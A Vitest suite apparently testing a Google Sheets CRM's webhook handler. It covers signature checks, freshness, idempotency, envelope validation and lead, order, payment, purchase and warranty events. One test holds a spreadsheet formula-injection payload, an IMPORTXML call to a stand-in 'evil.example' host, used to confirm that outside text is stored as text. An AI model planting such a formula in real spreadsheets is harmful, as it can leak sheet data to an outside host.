// The webhook of the platform: the signature (HMAC-SHA256), the freshness, the idempotency by the id of the event, the
// checks of the envelope and the five events. Everything runs on the mock of Apps Script; nothing goes to the network.
import { createHmac } from "node:crypto";
import { beforeAll, beforeEach, describe, expect, it } from "vitest";
import { createProject } from "../crm-sheets/scripts/env.mjs";

const NOW = new Date("2026-11-03T11:00:00+05:00");
const SECRET = "dGVzdC1rZXktbm90LWEtcmVhbC1zZWNyZXQ="; // gitleaks:allow test value, not a secret
const PREV = "b2xkLXRlc3Qta2V5LW5vdC1hLXJlYWwtc2VjcmV0"; // gitleaks:allow test value, not a secret
let p;
let n = 0;
const read = (k) => p.call("nvReadTable", k);

const iso = (ms) => {
  const d = new Date(ms + 5 * 3600000);
  return `${d.toISOString().slice(0, 19)}+05:00`;
};

/** A signed request as the platform would send it. */
function request(type, data, o = {}) {
  n += 1;
  const nowMs = o.nowMs ?? p.env.now.getTime();
  const ts = String(o.ts ?? Math.floor(nowMs / 1000));
  const envelope = {
    v: 1,
    id: o.id ?? `0198a000-0000-7000-8000-${String(n).padStart(12, "0")}`,
    type,
    env: o.env ?? "production",
    source: "nivel-platform",
    occurred_at: iso(nowMs),
    sent_at: o.sentAt ?? iso(Number(ts) * 1000),
    data,
    ...(o.envelope || {}),
  };
  const body = o.body ?? JSON.stringify(envelope);
  const sig =
    o.sig ??
    createHmac("sha256", o.secret ?? SECRET)
      .update(`${ts}.${body}`)
      .digest("hex");
  return {
    envelope,
    e: { postData: { contents: body, type: "application/json" }, parameter: { v: "1", ts, sig }, parameters: {} },
  };
}

/** Sends a request and returns the answer and the new rows of the journal. */
function send(req) {
  const before = read("webhook").length;
  const out = p.call("doPost", req.e);
  const answer = JSON.parse(out.getContent());
  return { answer, mime: out.mime, journal: read("webhook").slice(before) };
}

const leadData = (num, o = {}) => ({
  number: num,
  created_at: "2026-11-03T10:50:00+05:00",
  channel: "bot",
  source_code: "ig_reels_1",
  utm: { source: "instagram", medium: "social", campaign: "reels1" },
  lang: "ru",
  district: "Chilonzor",
  scope: "setup",
  budget_band: "20-40",
  wanted_by: "2026-11-20",
  configuration_code: "A1B2C3D4",
  customer: { ref: "0198a111-2222-7333-8444-555566667777", display_name: "Дилшод", telegram_username: "@dilshod" },
  tg_topic_url: null,
  admin_url: "https://admin.example/leads/1",
  ...o,
});

beforeAll(() => {
  p = createProject({ now: NOW, scriptProps: { NIVEL_HMAC_SECRET: SECRET, OWNER_EMAIL: "owner@example.com" } });
  p.call("nvSetup");
}, 120_000);

beforeEach(() => {
  p.env.now = NOW;
  p.env.cache.clear();
  p.env.lockHeldElsewhere = false;
  p.env.mails.length = 0;
  p.env.fetches.length = 0;
});

describe("the signature and the envelope", () => {
  it("answers JSON, always as a text output; an unsigned or wrongly signed request is refused and written to the journal", () => {
    const req = request("lead.created", leadData("L-2026-0100"), { sig: "00".repeat(32) });
    const r = send(req);
    expect(r.mime).toBe("JSON");
    // The body is not read before the signature is checked, so the answer has no id yet
    expect(r.answer).toEqual({ ok: false, id: null, result: null, error: "bad_signature" });
    expect(r.journal).toHaveLength(1);
    expect(r.journal[0].result).toBe("Отклонено");
    expect(r.journal[0].error).toBe("bad_signature");
    expect(read("leads")).toHaveLength(0);
  });

  it("a signature made with a changed body does not pass (the raw body is signed, byte for byte)", () => {
    const req = request("lead.created", leadData("L-2026-0101"));
    const tampered = req.e.postData.contents.replace("Дилшод", "Другой ");
    req.e.postData.contents = tampered;
    expect(send(req).answer.error).toBe("bad_signature");
  });

  it("the key is the secret string as stored: a key of the same bytes in another form does not pass", () => {
    const req = request("lead.created", leadData("L-2026-0102"), {
      secret: Buffer.from(SECRET, "base64").toString("latin1"),
    });
    expect(send(req).answer.error).toBe("bad_signature");
  });

  it("without a stored key nothing is accepted", () => {
    p.env.scriptProps.delete("NIVEL_HMAC_SECRET");
    const req = request("lead.created", leadData("L-2026-0103"));
    const r = send(req);
    expect(r.answer.error).toBe("bad_signature");
    expect(r.journal[0].summary).toContain("ключ вебхука не задан");
    p.env.scriptProps.set("NIVEL_HMAC_SECRET", SECRET);
  });

  it("a stale or a future time stamp is refused (300 seconds)", () => {
    const now = p.env.now.getTime();
    expect(
      send(request("lead.created", leadData("L-2026-0104"), { ts: Math.floor(now / 1000) - 301 })).answer.error,
    ).toBe("stale");
    expect(
      send(request("lead.created", leadData("L-2026-0105"), { ts: Math.floor(now / 1000) + 301 })).answer.error,
    ).toBe("stale");
    expect(send(request("lead.created", leadData("L-2026-0106"), { ts: "abc", sentAt: iso(now) })).answer.error).toBe(
      "stale",
    );
    const fresh = send(request("lead.created", leadData("L-2026-0107"), { ts: Math.floor(now / 1000) - 299 }));
    expect(fresh.answer.ok).toBe(true);
  });

  it("a body that is not JSON, a wrong version, a missing id or a sent_at that does not match the stamp: bad_payload", () => {
    expect(send(request("lead.created", {}, { body: "{not json" })).answer.error).toBe("bad_payload");
    expect(send(request("lead.created", leadData("L-2026-0108"), { envelope: { v: 2 } })).answer.error).toBe(
      "bad_payload",
    );
    expect(send(request("lead.created", leadData("L-2026-0108"), { envelope: { id: undefined } })).answer.error).toBe(
      "bad_payload",
    );
    const mismatched = send(
      request("lead.created", leadData("L-2026-0108"), { sentAt: iso(p.env.now.getTime() - 60_000) }),
    );
    expect(mismatched.answer.error).toBe("bad_payload");
    expect(mismatched.journal[0].summary).toBe("поле sent_at");
  });

  it("a body above 50 KB is refused", () => {
    const big = request("lead.created", leadData("L-2026-0109", { admin_url: "x".repeat(60_000) }));
    expect(send(big).answer.error).toBe("bad_payload");
  });

  it("only the production environment is accepted: staging and development are refused", () => {
    expect(send(request("lead.created", leadData("L-2026-0110"), { env: "staging" })).answer.error).toBe("wrong_env");
    expect(send(request("lead.created", leadData("L-2026-0110"), { env: "development" })).answer.error).toBe(
      "wrong_env",
    );
    expect(read("leads").some((l) => l.num === "L-2026-0110")).toBe(false);
  });

  it("an unknown type is written to the journal and not applied", () => {
    const r = send(request("order.deleted", { number: "NV-2026-0001" }));
    expect(r.answer.error).toBe("unknown_type");
    expect(r.journal[0].type).toBe("order.deleted");
    expect(r.journal[0].result).toBe("Отклонено");
  });

  it("the journal keeps a short hash and a summary, never the body", () => {
    const r = send(request("lead.created", leadData("L-2026-0111")));
    const row = r.journal[0];
    expect(row.hash).toMatch(/^[0-9a-f]{16}$/);
    const text = JSON.stringify(row);
    expect(text).not.toContain("Дилшод");
    expect(text).not.toContain("@dilshod");
    expect(text).not.toContain("0198a111-2222");
  });

  it("the time of the constant comparison does not depend on where the strings differ (all the characters are looked at)", () => {
    expect(p.call("nvConstantTimeEqual", "abcdef", "abcdef")).toBe(true);
    expect(p.call("nvConstantTimeEqual", "abcdef", "abcdeg")).toBe(false);
    expect(p.call("nvConstantTimeEqual", "abcdef", "abcde")).toBe(false);
    expect(p.call("nvConstantTimeEqual", "", "")).toBe(true);
  });

  it("the previous key is accepted for seven days after a change and not after", () => {
    p.env.scriptProps.set("NIVEL_HMAC_SECRET", PREV);
    p.env.scriptProps.set("NIVEL_HMAC_SECRET_PREV", SECRET);
    p.env.scriptProps.set("NIVEL_HMAC_SECRET_PREV_UNTIL", String(p.env.now.getTime() + 7 * 86_400_000));
    expect(send(request("lead.created", leadData("L-2026-0112"))).answer.ok).toBe(true);
    p.env.scriptProps.set("NIVEL_HMAC_SECRET_PREV_UNTIL", String(p.env.now.getTime() - 1000));
    expect(send(request("lead.created", leadData("L-2026-0113"))).answer.error).toBe("bad_signature");
    p.env.scriptProps.set("NIVEL_HMAC_SECRET", SECRET);
    p.env.scriptProps.delete("NIVEL_HMAC_SECRET_PREV");
  });

  it("more than 30 rejections in a minute are not written to the journal again (a flood cannot fill the sheet)", () => {
    const before = read("webhook").length;
    for (let i = 0; i < 45; i++) send(request("lead.created", leadData(`L-2026-02${i}`), { sig: "11".repeat(32) }));
    expect(read("webhook").length - before).toBe(30);
  });
});

describe("text from outside never becomes a formula", () => {
  it("a name that starts with = + - @ is stored as text, in the sheet and in the journal", () => {
    const evil = '=IMPORTXML("https://evil.example/x";"//a")';
    const r = send(
      request(
        "lead.created",
        leadData("L-2026-0140", {
          customer: { ref: "0198a999-0000-7000-8000-000000000001", display_name: evil, telegram_username: "@ok" },
        }),
      ),
    );
    expect(r.answer.result).toBe("applied");
    const lead = read("leads").find((l) => l.num === "L-2026-0140");
    expect(lead.name).toBe(evil);
    const sh = p.env.ss.getSheetByName("Заявки");
    const cell = sh._cell(
      lead._row,
      2 + JSON.parse(p.run("JSON.stringify(NV_SCHEMA.leads.cols.map((c) => c.key))")).indexOf("name"),
    );
    expect(cell.f).toBeUndefined();
    expect(read("clients").find((c) => c.ref === "0198a999-0000-7000-8000-000000000001").name).toBe(evil);
  });

  it("nvSafeText only touches strings that could be read as a formula or a number sign", () => {
    expect(p.call("nvSafeText", "=1+1")).toBe("'=1+1");
    expect(p.call("nvSafeText", "+998901234567")).toBe("'+998901234567");
    expect(p.call("nvSafeText", "-5")).toBe("'-5");
    expect(p.call("nvSafeText", "@nick")).toBe("'@nick");
    expect(p.call("nvSafeText", "Обычный текст")).toBe("Обычный текст");
    expect(p.call("nvSafeText", 12)).toBe(12);
    expect(p.call("nvSafeText", "")).toBe("");
  });
});

describe("idempotency and the lock", () => {
  it("a repeated id answers «duplicate», changes nothing and is written as «Повтор»", () => {
    const req = request("lead.created", leadData("L-2026-0120"));
    const first = send(req);
    expect(first.answer).toEqual({ ok: true, id: req.envelope.id, result: "applied", error: null });
    const count = read("leads").length;
    const second = send(req);
    expect(second.answer).toEqual({ ok: true, id: req.envelope.id, result: "duplicate", error: null });
    expect(second.journal[0].result).toBe("Повтор");
    expect(read("leads")).toHaveLength(count);
  });

  it("the memory of the cache is not the only one: after the cache is lost, the journal still knows the id", () => {
    const req = request("lead.created", leadData("L-2026-0121"));
    send(req);
    p.env.cache.clear();
    expect(send(req).answer.result).toBe("duplicate");
  });

  it("a busy lock answers «locked», writes nothing, and the same event is applied when the platform repeats it", () => {
    const req = request("lead.created", leadData("L-2026-0122"));
    p.env.lockHeldElsewhere = true;
    const busy = send(req);
    expect(busy.answer).toEqual({ ok: false, id: req.envelope.id, result: null, error: "locked" });
    expect(busy.journal).toHaveLength(0);
    expect(read("leads").some((l) => l.num === "L-2026-0122")).toBe(false);
    p.env.lockHeldElsewhere = false;
    expect(send(req).answer.result).toBe("applied");
    expect(read("leads").some((l) => l.num === "L-2026-0122")).toBe(true);
  });
});

describe("lead.created", () => {
  it("makes a row with the number of the platform, the source «Платформа», the client by the reference, the label of the channel and the scope", () => {
    const r = send(request("lead.created", leadData("L-2026-0130")));
    expect(r.answer.result).toBe("applied");
    const lead = read("leads").find((l) => l.num === "L-2026-0130");
    expect(lead.src).toBe("Платформа");
    expect(lead.channel).toBe("Telegram-бот");
    expect(lead.scope).toBe("Сетап");
    expect(lead.band).toBe("20–40 млн");
    expect(lead.source).toBe("ig_reels_1");
    expect(lead.status).toBe("Новая");
    expect(lead.config).toBe("A1B2C3D4");
    expect(lead.name).toBe("Дилшод");
    const client = read("clients").find((c) => c.ref === "0198a111-2222-7333-8444-555566667777");
    expect(client.code).toMatch(/^K-/);
    expect(lead.client).toBe(client.code);
    expect(
      read("history").some((h) => h.num === "L-2026-0130" && h.how === "Платформа" && h.event === "LEAD_CREATED"),
    ).toBe(true);
  });

  it("raises the counter to the number of the platform: the sheet never issues the same number", () => {
    send(request("lead.created", leadData("L-2026-0500")));
    expect(p.env.scriptProps.get("COUNTER_L_2026")).toBe("500");
    const num = p.call("nvCreateLead", { channel: "Сайт", scope: "ПК", name: "Ручная" });
    expect(num).toBe("L-2026-0501");
  });

  it("the same lead under a new id is «ignored», not a second row", () => {
    const count = read("leads").length;
    const r = send(request("lead.created", leadData("L-2026-0130")));
    expect(r.answer.result).toBe("ignored");
    expect(read("leads")).toHaveLength(count);
  });

  it("a code the sheet does not know is bad_payload and names the field", () => {
    const r = send(request("lead.created", leadData("L-2026-0131", { scope: "mystery" })));
    expect(r.answer.error).toBe("bad_payload");
    expect(r.journal[0].summary).toContain("scope");
    expect(read("leads").some((l) => l.num === "L-2026-0131")).toBe(false);
    expect(send(request("lead.created", leadData("L-2026-0132", { channel: "pigeon" }))).journal[0].summary).toContain(
      "channel",
    );
    expect(send(request("lead.created", leadData("X-2026-0001"))).journal[0].summary).toContain("number");
  });
});

const quote = (o = {}) => ({
  id: "q1",
  version: 1,
  components_sum: 20_000_000,
  outside_scale_sum: 0,
  purchase_limit: 20_600_000,
  reserve_bp: 300,
  reserve_sum: 600_000,
  fee_total: 3_000_000,
  fee_commission_line: 1_500_000,
  fee_works_line: 1_500_000,
  fee_advance: 900_000,
  fee_final: 2_100_000,
  grand_total: 23_600_000,
  eligibility: "full_cycle",
  valid_until: "2026-11-04T11:00:00+05:00",
  ...o,
});
const orderData = (num, seq, from, to, event, o = {}) => ({
  number: num,
  lead_number: "L-2026-0130",
  customer_ref: "0198a111-2222-7333-8444-555566667777",
  kind: "pc",
  seq,
  from,
  to,
  event,
  actor: "owner",
  at: "2026-11-03T10:59:00+05:00",
  flags: { fee_prepaid: false, funds_received: false, first_order_meeting_done: false },
  quote: quote(),
  dates: {},
  report: null,
  cancel: null,
  ledger: [],
  ...o,
});

describe("order.status_changed", () => {
  it("creates the order that the sheet does not know, in the status of the platform, with the estimate and the history", () => {
    const r = send(
      request("order.status_changed", orderData("NV-2026-0200", 2, "estimate_draft", "estimate_sent", "SEND_ESTIMATE")),
    );
    expect(r.answer.result).toBe("applied");
    const o = read("orders").find((x) => x.num === "NV-2026-0200");
    expect(o.code).toBe("estimate_sent");
    expect(o.status).toBe("Смета отправлена");
    expect(o.src).toBe("Платформа");
    expect(o.seq).toBe(2);
    expect(o.basePc).toBe(20_000_000);
    expect(o.purchased).toBe(20_000_000);
    expect(o.lead).toBe("L-2026-0130");
    expect(new Date(o.validUntil).getTime()).toBe(new Date("2026-11-04T11:00:00+05:00").getTime());
    expect(new Date(o.dEstimate).getTime()).toBe(new Date("2026-11-03T10:59:00+05:00").getTime());
    expect(r.journal[0].summary).not.toContain("расхождение");
    const h = read("history").filter((x) => x.num === "NV-2026-0200");
    expect(h.at(-1)).toMatchObject({ event: "SEND_ESTIMATE", how: "Платформа", actor: "Владелец", seq: 2 });
    expect(p.env.scriptProps.get("COUNTER_NV_2026")).toBe("200");
  });

  it("an older or the same seq only goes to the journal («Устарело»); a newer one is applied; the manual columns stay", () => {
    const row = read("orders").find((x) => x.num === "NV-2026-0200")._row;
    p.run(`nvWriteCells("orders", ${row}, { nextStep: "Позвонить клиенту", notes: "Заметка владельца" })`);
    const stale = send(
      request("order.status_changed", orderData("NV-2026-0200", 2, "estimate_sent", "accepted", "ACCEPT")),
    );
    expect(stale.answer.result).toBe("stale_seq");
    expect(stale.journal[0].result).toBe("Устарело");
    expect(read("orders").find((x) => x.num === "NV-2026-0200").code).toBe("estimate_sent");
    const fresh = send(
      request(
        "order.status_changed",
        orderData("NV-2026-0200", 3, "estimate_sent", "accepted", "ACCEPT", { actor: "customer" }),
      ),
    );
    expect(fresh.answer.result).toBe("applied");
    const o = read("orders").find((x) => x.num === "NV-2026-0200");
    expect(o.code).toBe("accepted");
    expect(o.seq).toBe(3);
    expect(o.nextStep).toBe("Позвонить клиенту");
    expect(o.notes).toBe("Заметка владельца");
    expect(
      read("history")
        .filter((x) => x.num === "NV-2026-0200")
        .at(-1).actor,
    ).toBe("Клиент");
  });

  it("the dates, the report, the flags and the ledger of the event are written; the ledger once even if it comes again", () => {
    const data = orderData("NV-2026-0200", 8, "report_due", "report_sent", "SEND_REPORT", {
      dates: {
        report_due_at: "2026-11-04T17:00:00+05:00",
        objection_until: "2026-11-07T12:00:00+05:00",
        refund_due_at: "2026-11-10T12:00:00+05:00",
      },
      report: { accepted: false, objection_open: false },
      flags: { fee_prepaid: true, funds_received: true, first_order_meeting_done: true },
      ledger: [{ fund: "tax_risk", amount: 200_000 }],
    });
    expect(send(request("order.status_changed", data)).answer.result).toBe("applied");
    const o = read("orders").find((x) => x.num === "NV-2026-0200");
    expect(o.code).toBe("report_sent");
    expect(o.reportAccepted).toBe("Нет");
    expect(o.meetingDone).toBe(true);
    expect(new Date(o.objectionUntil).getTime()).toBe(new Date("2026-11-07T12:00:00+05:00").getTime());
    expect(new Date(o.refundDue).getTime()).toBe(new Date("2026-11-10T12:00:00+05:00").getTime());
    expect(new Date(o.reportTarget).getTime()).toBe(new Date("2026-11-04T17:00:00+05:00").getTime());
    const ledger = () => read("reserves").filter((x) => x.ref === "NV-2026-0200");
    expect(ledger()).toHaveLength(1);
    expect(ledger()[0]).toMatchObject({
      fund: "Налоговый риск",
      amount: 200_000,
      basis: "Взнос при сверке",
      who: "Платформа",
    });
    send(request("order.status_changed", { ...data, seq: 9, event: "OBJECTION" }));
    expect(ledger()).toHaveLength(1);
  });

  it("the cancellation block of the platform lands in the cancellation columns", () => {
    const data = orderData("NV-2026-0200", 12, "report_sent", "cancelling", "CANCEL", {
      cancel: {
        point: "after_purchase_before_assembly",
        reason: "Клиент передумал",
        settlement: {
          fee_earned: 1_500_000,
          fee_to_refund: 0,
          fee_to_invoice: 600_000,
          funds_to_refund: 1_000_000,
          parts_go_to: "shop_or_client",
          due_by: "2026-11-12T12:00:00+05:00",
        },
      },
    });
    expect(send(request("order.status_changed", data)).answer.result).toBe("applied");
    const o = read("orders").find((x) => x.num === "NV-2026-0200");
    expect(o.code).toBe("cancelling");
    expect(o.cancelPoint).toBe("После закупки, до сборки");
    expect(o.feeEarned).toBe(1_500_000);
    expect(o.feeToInvoice).toBe(600_000);
    expect(o.fundsToRefund).toBe(1_000_000);
    expect(o.partsTo).toBe("Магазину или клиенту");
    expect(o.cancelReason).toBe("Клиент передумал");
  });

  it("a status or an event that the sheet does not know is bad_payload with the field", () => {
    const bad = send(request("order.status_changed", orderData("NV-2026-0201", 1, null, "flying", "SEND_ESTIMATE")));
    expect(bad.answer.error).toBe("bad_payload");
    expect(bad.journal[0].summary).toContain("to");
    const badEvent = send(
      request("order.status_changed", orderData("NV-2026-0201", 1, null, "estimate_draft", "TELEPORT")),
    );
    expect(badEvent.journal[0].summary).toContain("event");
  });

  it("the sheet tells when its own formulas give another estimate than the platform", () => {
    const r = send(
      request(
        "order.status_changed",
        orderData("NV-2026-0202", 1, null, "estimate_draft", "SEND_ESTIMATE", {
          quote: quote({ fee_total: 2_000_000 }),
        }),
      ),
    );
    expect(r.answer.result).toBe("applied");
    expect(r.journal[0].summary).toContain("расхождение со сметой платформы");
  });

  it("the parts of the setup in the estimate (optional fields) are used when the platform sends them", () => {
    const r = send(
      request(
        "order.status_changed",
        orderData("NV-2026-0203", 1, null, "estimate_draft", "REVISE", {
          kind: "setup",
          quote: quote({
            components_sum: 25_000_000,
            pc_base: 17_500_000,
            mount_base: 7_500_000,
            purchased_by_ip: 25_000_000,
            memory_ssd: 0,
            fee_total: 3_750_000,
            purchase_limit: 25_750_000,
            reserve_sum: 750_000,
            eligibility: "full_cycle",
          }),
        }),
      ),
    );
    expect(r.journal[0].summary).not.toContain("расхождение");
    const o = read("orders").find((x) => x.num === "NV-2026-0203");
    expect(o.basePc).toBe(17_500_000);
    expect(o.baseMount).toBe(7_500_000);
    expect(o.kind).toBe("Сетап");
  });
});

const payData = (id, o = {}) => ({
  payment_id: id,
  order_number: "NV-2026-0200",
  kind: "fee_advance",
  direction: "in",
  method: "xolis_qr",
  amount_sum: 900_000,
  status: "confirmed",
  fiscal_receipt_no: "FS-777",
  bank_doc_no: null,
  occurred_at: "2026-11-03T09:00:00+05:00",
  confirmed_at: "2026-11-03T09:01:00+05:00",
  payer_is_customer: true,
  reversal_of: null,
  ...o,
});

describe("payment.confirmed", () => {
  it("writes the payment by its id with the labels of the kind and of the method, confirmed by the platform", () => {
    const r = send(request("payment.confirmed", payData("0198aaaa-0000-7000-8000-000000000001")));
    expect(r.answer.result).toBe("applied");
    const pay = read("payments").find((x) => x.id === "0198aaaa-0000-7000-8000-000000000001");
    expect(pay).toMatchObject({
      order: "NV-2026-0200",
      kind: "Аванс платы 30 %",
      method: "QR Xolis",
      amount: 900_000,
      status: "Подтверждён",
      receipt: "FS-777",
      confirmedBy: "Платформа",
      src: "Платформа",
    });
    expect(pay.payerIsClient).toBe(true);
  });

  it("the same payment again (a new event) updates the row: a voided payment is voided in the sheet", () => {
    const id = "0198aaaa-0000-7000-8000-000000000001";
    const count = read("payments").length;
    send(request("payment.confirmed", payData(id, { status: "void" })));
    expect(read("payments")).toHaveLength(count);
    const pay = read("payments").find((x) => x.id === id);
    expect(pay.status).toBe("Аннулирован");
    expect(pay.voidReason).toContain("платформ");
  });

  it("a wrong pair of kind and method is written down with the error and the owner is told", () => {
    const id = "0198aaaa-0000-7000-8000-000000000002";
    const r = send(request("payment.confirmed", payData(id, { method: "bank_transfer_ip" })));
    expect(r.answer.result).toBe("applied");
    expect(r.journal[0].summary).toContain("ПРОВЕРКА");
    const pay = read("payments").find((x) => x.id === id);
    expect(pay.check).toBe("");
    expect(p.call("nvCheckPayment", pay.kind, pay.method, pay.status, pay.receipt)).toBe(
      "Неверная пара: плата только QR или карта",
    );
    expect(p.env.mails.length + p.env.fetches.length).toBeGreaterThan(0);
  });

  it("a fee without a fiscal receipt that the platform calls confirmed is flagged", () => {
    const r = send(
      request("payment.confirmed", payData("0198aaaa-0000-7000-8000-000000000003", { fiscal_receipt_no: null })),
    );
    expect(r.journal[0].summary).toContain("Нужен фискальный чек");
  });

  it("unknown codes and a bad amount are bad_payload", () => {
    expect(send(request("payment.confirmed", payData("x1", { kind: "gift" }))).journal[0].summary).toContain("kind");
    expect(send(request("payment.confirmed", payData("x2", { method: "cash" }))).journal[0].summary).toContain(
      "method",
    );
    expect(send(request("payment.confirmed", payData("x3", { amount_sum: 10.5 }))).journal[0].summary).toContain(
      "amount_sum",
    );
    expect(send(request("payment.confirmed", payData("x4", { amount_sum: 0 }))).journal[0].summary).toContain(
      "amount_sum",
    );
  });
});

const purData = (id, o = {}) => ({
  purchase_id: id,
  order_number: "NV-2026-0200",
  title: "Процессор",
  category_code: "Процессор",
  vendor_name: "Магазин 1",
  qty: 1,
  amount_sum: 6_200_000,
  paid_via: "bank_transfer",
  receipt_kind: "fiscal",
  receipt_no: "ЧК-1",
  esf_no: null,
  esf_due: null,
  discount_sum: 0,
  bonus_note: "",
  serials: ["SN1", "SN2"],
  vendor_warranty_months: 36,
  vendor_warranty_until: "2029-11-03",
  bought_at: "2026-11-03T10:00:00+05:00",
  totals: { receipts_total: 6_200_000, funds_received: 20_600_000, purchase_limit: 20_600_000 },
  ...o,
});

describe("purchase.recorded", () => {
  it("writes the receipt by its id with the serial numbers, the document and the warranty of the shop", () => {
    const r = send(request("purchase.recorded", purData("0198bbbb-0000-7000-8000-000000000001")));
    expect(r.answer.result).toBe("applied");
    const row = read("purchases").find((x) => x.id === "0198bbbb-0000-7000-8000-000000000001");
    expect(row).toMatchObject({
      order: "NV-2026-0200",
      item: "Процессор",
      amount: 6_200_000,
      paidWith: "Перевод",
      docKind: "Фискальный чек",
      receipt: "ЧК-1",
      serials: "SN1, SN2",
      warrantyMonths: 36,
      src: "Платформа",
    });
    expect(r.journal[0].summary).not.toContain("ПРЕДУПРЕЖДЕНИЕ");
  });

  it("a total of the platform that differs from the sheet is a warning in the journal", () => {
    const r = send(
      request(
        "purchase.recorded",
        purData("0198bbbb-0000-7000-8000-000000000002", {
          amount_sum: 1_000_000,
          totals: { receipts_total: 9_999, funds_received: 1, purchase_limit: 1 },
        }),
      ),
    );
    expect(r.journal[0].summary).toContain("ПРЕДУПРЕЖДЕНИЕ");
  });

  it("an update of the same receipt does not add a row", () => {
    const id = "0198bbbb-0000-7000-8000-000000000001";
    const count = read("purchases").length;
    send(request("purchase.recorded", purData(id, { amount_sum: 6_300_000 })));
    expect(read("purchases")).toHaveLength(count);
    expect(read("purchases").find((x) => x.id === id).amount).toBe(6_300_000);
  });

  it("unknown ways of payment or documents are bad_payload", () => {
    expect(send(request("purchase.recorded", purData("p9", { paid_via: "gold" }))).journal[0].summary).toContain(
      "paid_via",
    );
    expect(send(request("purchase.recorded", purData("p9", { receipt_kind: "napkin" }))).journal[0].summary).toContain(
      "receipt_kind",
    );
  });
});

describe("warranty.case_opened", () => {
  it("makes the case with the terms of the platform, the history, and tells the owner at once", () => {
    const data = {
      number: "G-2026-0001",
      order_number: "NV-2026-0200",
      purchase_id: null,
      opened_at: "2026-11-03T10:30:00+05:00",
      channel: "bot",
      summary: "Шумит вентилятор",
      status: "opened",
      deadlines: {
        reply: "2026-11-04T10:30:00+05:00",
        diagnosis: "2026-11-05T10:30:00+05:00",
        loaner: "2026-11-06T10:30:00+05:00",
        fix_work: "2026-11-17T10:30:00+05:00",
        fix_parts: "2026-11-23T10:30:00+05:00",
      },
    };
    const r = send(request("warranty.case_opened", data));
    expect(r.answer.result).toBe("applied");
    const w = read("warranty").find((x) => x.num === "G-2026-0001");
    expect(w.status).toBe("Открыт");
    expect(w.channel).toBe("Бот");
    expect(w.src).toBe("Платформа");
    expect(new Date(w.replyBy).getTime()).toBe(new Date("2026-11-04T10:30:00+05:00").getTime());
    expect(new Date(w.diagBy).getTime()).toBe(new Date("2026-11-05T10:30:00+05:00").getTime());
    expect(new Date(w.fixBy).getTime()).toBe(new Date("2026-11-17T10:30:00+05:00").getTime());
    expect(read("history").some((h) => h.num === "G-2026-0001" && h.how === "Платформа")).toBe(true);
    expect(p.env.mails.some((m) => m.body.includes("G-2026-0001"))).toBe(true);
    expect(send(request("warranty.case_opened", data)).answer.result).toBe("ignored");
  });
});

describe("what the platform sends is documented as it is accepted", () => {
  it("the journal sheet lists the answers and the errors of the documentation", () => {
    expect(JSON.parse(p.run("JSON.stringify(NV_WEBHOOK_ERRORS)")).sort()).toEqual(
      ["bad_payload", "bad_signature", "locked", "stale", "unknown_type", "wrong_env"].sort(),
    );
    expect(JSON.parse(p.run("JSON.stringify(NV_WEBHOOK_TYPES)"))).toEqual([
      "lead.created",
      "order.status_changed",
      "payment.confirmed",
      "purchase.recorded",
      "warranty.case_opened",
    ]);
  });

  it("remembers when the last event came (the self-check reads it)", () => {
    expect(Number(p.env.scriptProps.get("NV_LAST_WEBHOOK_AT"))).toBeGreaterThan(0);
  });
});
